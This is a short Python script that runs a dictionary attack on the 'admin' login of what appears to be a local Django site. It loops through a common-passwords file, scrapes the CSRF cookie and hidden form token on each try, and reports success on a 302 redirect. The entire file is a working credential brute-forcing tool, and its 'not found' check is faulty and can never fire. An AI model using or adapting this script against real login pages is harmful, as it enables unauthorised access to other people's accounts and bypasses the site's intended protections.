from http.client import HTTPResponse
import sys
import requests
import re
def main():
    params = sys.argv
    username = "admin"
    url = "http://127.0.0.1:8000/login/"
    filez = open("1000-most-common-passwords.txt","r")
    passworddict =filez.readlines()
    counter = 0
    while (counter < len(passworddict)):
        password = passworddict[counter].strip()
        req = requests.get(url = url)
        csrftoken = req.cookies.get("csrftoken")
        mwt=searchforcsrf(req)
        print("Trying Password: "+ password)
        headers = {'Content-type': 'application/x-www-form-urlencoded'}
        submitform = requests.post(headers=headers,url=url,cookies={"csrftoken":csrftoken},data={"csrfmiddlewaretoken":mwt,"username":username,"password":password},allow_redirects=False)
        counter = counter + 1
        if submitform.status_code == 302:
            print("SUCCESSSSSSSSSSSSSSSSSSSSSSS")
            print("Password is    " + password)
            break
    if  len(passworddict)<counter:
        print("password not found")

def searchforcsrf(input):
        x = input.text
        inputtag = re.search(r"<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"[^\"]*\">",x)
        valuelist = re.findall(r"\"[^\"]*\"",inputtag.group())
        mwt = valuelist[2]
        mwt =mwt.strip('\"')
        return mwt
main()


